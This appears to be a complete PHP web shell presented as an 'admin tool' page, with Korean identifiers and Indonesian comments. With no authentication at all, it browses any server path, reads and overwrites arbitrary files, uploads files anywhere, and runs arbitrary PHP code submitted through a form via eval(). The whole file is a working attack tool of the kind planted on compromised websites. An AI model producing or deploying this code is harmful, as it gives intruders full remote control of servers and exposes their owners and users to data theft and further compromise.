<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>관리-도구</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
        }
        #container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #222;
        }
        h1, h2, h3 {
            color: #bbb;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            margin-bottom: 10px;
        }
        a {
            text-decoration: none;
            color: #1e90ff;
        }
        input, textarea {
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            padding: 5px;
            width: 100%;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            cursor: pointer;
        }
        hr {
            border: 0;
            height: 1px;
            background-color: #444;
        }
        textarea {
            height: 150px;
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>관리-도구</h1>

        <?php
        function 클린($데이터) {
            return htmlspecialchars(strip_tags($데이터));
        }

        function 파일크기($바이트) {
            $단위 = ['B', 'KB', 'MB', 'GB', 'TB'];
            if ($바이트 == 0) return '0 B'; // Tambahan untuk file 0KB
            $지수 = floor(log($바이트, 1024));
            return @round($바이트 / pow(1024, $지수), 2) . ' ' . $단위[$지수];
        }

        function 탐색($경로) {
            $경로 = str_replace('\\', '/', $경로);
            $부분들 = explode('/', $경로);
            $결과 = [];
            foreach ($부분들 as $인덱스 => $부분) {
                if ($부분 === '' && $인덱스 === 0) {
                    $결과[] = '<a href="?경로=/">/</a>';
                    continue;
                }
                if ($부분 === '') continue;
                $결과[] = '<a href="?경로=';
                for ($i = 0; $i <= $인덱스; $i++) {
                    $결과[] = $부분들[$i];
                    if ($i != $인덱스) $결과[] = "/";
                }
                $결과[] = '">' . $부분 . '</a>/';
            }
            return implode('', $결과);
        }

        function 내용보기($경로) {
            $목록 = @scandir($경로) ?: [];
            $폴더 = [];
            $파일들 = [];
            foreach ($목록 as $항목) {
                if ($항목 === '.' || $항목 === '..') continue;
                $전체경로 = $경로 . '/' . $항목;

                // Cek apakah direktori atau file
                if (@is_dir($전체경로)) {
                    $폴더[] = '<li><strong>폴더:</strong> <a href="?경로=' . urlencode($전체경로) . '">' . $항목 . '</a></li>';
                } else {
                    $파일크기 = @filesize($전체경로);
                    $크기 = ($파일크기 === false || $파일크기 === 0) ? '0 B' : 파일크기($파일크기); // Tangani 0KB file
                    $파일들[] = '<li><strong>파일:</strong> <a href="?작업=편집&파일=' . urlencode($항목) . '&경로=' . urlencode($경로) . '">' . $항목 . '</a> (' . $크기 . ')</li>';
                }
            }
            echo '<ul>';
            echo implode('', $폴더);
            if (!empty($폴더) && !empty($파일들)) echo '<hr>';
            echo implode('', $파일들);
            echo '</ul>';
        }

        function 파일편집($파일경로) {
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['파일내용'])) {
                $내용 = $_POST['파일내용'];
                if (@file_put_contents($파일경로, $내용) !== false) {
                    echo "파일 저장 성공.";
                } else {
                    echo "파일 저장 실패.";
                }
            }
            $내용 = @file_get_contents($파일경로) ?: '';
            echo '<form method="post">';
            echo '<textarea name="파일내용">' . htmlspecialchars($내용) . '</textarea><br>';
            echo '<input type="submit" value="저장">';
            echo '</form>';
        }

        function 파일업로드($경로, $파일) {
            $목적지 = $경로 . '/' . basename($파일['name']);
            if (@move_uploaded_file($파일['tmp_name'], $목적지)) {
                echo "파일 업로드 성공: " . htmlspecialchars($파일['name']);
            } else {
                echo "파일 업로드 실패.";
            }
        }

        function PHP실행($코드) {
            try {
                ob_start();
                eval($코드);
                $output = ob_get_clean();
                echo '<div style="background-color:#333; padding:10px;">' . htmlspecialchars($output) . '</div>';
            } catch (Throwable $e) {
                echo "오류: " . htmlspecialchars($e->getMessage());
            }
        }

        $경로 = $_GET['경로'] ?? getcwd();
        if (isset($_GET['작업']) && $_GET['작업'] === '편집' && isset($_GET['파일'])) {
            $파일 = $_GET['파일'];
            $파일경로 = $경로 . '/' . $파일;
            if (@file_exists($파일경로)) {
                echo "<h2>편집 파일: $파일</h2>";
                파일편집($파일경로);
            } else {
                echo "파일이 존재하지 않습니다.";
            }
        } else {
            echo "<h2>경로: " . htmlspecialchars($경로) . "</h2>";
            echo "<p>" . 탐색($경로) . "</p>";
            echo "<h3>폴더 내용:</h3>";
            내용보기($경로);

            echo '<hr>';
            echo '<h3>파일 업로드:</h3>';
            echo '<form method="post" enctype="multipart/form-data">';
            echo '<input type="file" name="파일"><br>';
            echo '<input type="submit" value="업로드">';
            echo '</form>';

            echo '<h3>PHP 코드 실행:</h3>';
            echo '<form method="post">';
            echo '<textarea name="PHP코드"></textarea><br>';
            echo '<input type="submit" value="실행">';
            echo '</form>';
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['파일'])) {
            파일업로드($경로, $_FILES['파일']);
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['PHP코드'])) {
            echo '<h3>결과:</h3>';
            PHP실행($_POST['PHP코드']);
        }
        ?>
    </div>
</body>
</html>
